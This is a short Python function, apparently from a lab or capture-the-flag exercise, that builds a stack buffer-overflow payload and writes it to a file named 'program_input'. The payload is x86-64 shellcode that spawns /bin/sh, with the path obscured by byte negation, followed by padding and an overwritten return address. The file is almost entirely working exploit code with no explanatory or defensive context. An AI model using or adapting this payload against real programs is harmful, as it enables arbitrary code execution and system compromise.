def write_input_to_file(exploit = b'\xe9\xe3\xff\xff\xff\x7f', include_program=False):
    # exploit = b'\xe9\xe3\xff\xff\xff\x7f'
   

    program = b'\x48\x31\xd2\x48\x31\xf6\x48\xb8\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xd8\x50\x48\x89\xe7\x48\x31\xc0\x48\x83\xc0\x3b\x0f\x05'
    buffer = b'0'*8
    if include_program:
        payload = program + buffer + exploit
    else:
        payload = exploit
    f = open('program_input', 'wb')
    f.write(payload)